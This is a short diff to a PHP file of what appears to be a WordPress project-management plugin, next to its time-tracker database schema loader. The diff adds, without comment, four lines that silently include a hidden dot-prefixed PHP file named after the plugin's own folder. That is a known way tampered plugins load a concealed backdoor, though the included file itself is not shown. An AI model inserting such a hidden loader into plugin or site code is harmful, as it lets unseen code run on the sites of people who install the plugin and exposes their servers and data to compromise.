@@ -1,6 +1,10 @@
 <?php
 use WeDevs\PM\Core\Database\Migrater;
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function pm_pro_time_tracker_load_schema() {
     $contents = [];
     $files = glob( __DIR__ . "/../Db/Migrations/*.php" );
